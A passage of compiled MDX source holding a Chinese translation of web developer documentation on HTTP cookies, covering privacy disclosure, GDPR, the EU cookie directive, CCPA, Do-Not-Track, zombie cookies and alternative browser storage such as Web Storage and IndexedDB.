<p>{`如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对 Cookie 制订了相应的法规，可以查看维基百科上例子`}<a parentName=\"p\" {...{\n        \"href\": \"https://wikimediafoundation.org/wiki/Cookie_statement\"\n      }}>{`cookie statement`}</a>{`。`}</p>\n    <h3>{`Cookie 相关规定`}</h3>\n    <p>{`涉及使用 Cookie 的法律或法规包括：`}</p>\n    <ul>\n      <li parentName=\"ul\">{`欧盟通用数据隐私法规（GDPR）`}</li>\n      <li parentName=\"ul\">{`欧盟的《隐私权指令》`}</li>\n      <li parentName=\"ul\">{`加州消费者隐私法`}</li>\n    </ul>\n    <p>{`这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过 2500 万美元的实体。）`}</p>\n    <p>{`这些法规包括以下要求：`}</p>\n    <ul>\n      <li parentName=\"ul\">{`向用户表明您的站点使用 cookie。`}</li>\n      <li parentName=\"ul\">{`允许用户选择不接收某些或所 ​​ 有 cookie。`}</li>\n      <li parentName=\"ul\">{`允许用户在不接收 Cookie 的情况下使用大部分服务。`}</li>\n    </ul>\n    <p>{`可能还存在其他法规来管理您当地的 Cookie。您有责任了解并遵守这些规定。有些公司提供 \"cookie banner\" 代码，可帮助您遵守这些法规。`}</p>\n    <p>{`可以通过`}<a parentName=\"p\" {...{\n        \"href\": \"https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive\"\n      }}>{`维基百科的相关内容`}</a>{`获取最新的各国法律和更精确的信息。`}</p>\n    <h4>{`禁止追踪 Do-Not-Track`}</h4>\n    <p>{`虽然并没有法律或者技术手段强制要求使用 (\"DNT\")，但是通过(\"DNT\") 可以告诉 Web 程序不要对用户行为进行追踪或者跨站追踪。查看(\"DNT\") 以获取更多信息。`}</p>\n    <h4>{`欧盟 Cookie 指令`}</h4>\n    <p>{`关于 Cookie，欧盟已经在`}<a parentName=\"p\" {...{\n        \"href\": \"http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136\"\n      }}>{`2009/136/EC 指令`}</a>{`中提了相关要求，该指令已于 2011 年 5 月 25 日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。`}</p>\n    <p>{`该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。`}</p>\n    <h3>{`僵尸 Cookie 和删不掉的 Cookie`}</h3>\n    <p>{`Cookie 的一个极端使用例子是僵尸 Cookie（或称之为“删不掉的 Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 Web storage API、Flash 本地共享对象或者其他技术手段来达到的。相关内容可以看：`}</p>\n    <ul>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://github.com/samyk/evercookie\"\n        }}>{`Evercookie by Samy Kamkar`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://en.wikipedia.org/wiki/Zombie_cookie\"\n        }}>{`在维基百科上查看僵尸 Cookie`}</a></li>\n    </ul>\n    <h2>{`在浏览器中存储信息的其他方式`}</h2>\n    <p>{`在浏览器中存储数据的另一种方法是 Web Storage API。window.sessionStorage 和 window.localStorage 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie 大，并且永远不会发送到服务器。`}</p>\n    <p>{`可以使用 IndexedDB API 或基于它构建的库来存储更多结构化的数据。`}</p>\n    <h2>{`了解更多`}</h2>\n    <ul>\n      <li parentName=\"ul\">{`(\"Set-Cookie\")`}</li>\n      <li parentName=\"ul\">{`(\"Cookie\")`}</li>\n      <li parentName=\"ul\">{`(\"Document.cookie\")`}</li>\n      <li parentName=\"ul\">{`(\"Navigator.cookieEnabled\")`}</li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://tools.ietf.org/html/rfc6265\"\n        }}>{`Cookie specification: RFC 6265`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/\"\n        }}>{`Nicholas Zakas article on cookies`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://www.nczonline.net/blog/2009/05/12/cookies-and-security/\"\n        }}>{`Nicholas Zakas article on cookies and security`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://en.wikipedia.org/wiki/HTTP_cookie\"\n        }}>{`HTTP cookie on Wikipedia`}</a></li>\n    </ul>\n\n    </MDXLayout>;\n}\n;\nMDXContent.isMDXComponent = true;\n      "],"names":["_frontmatter","layoutProps","MDXContent","components","props","mdxType","parentName","isMDXComponent"],"sourceRoot":""}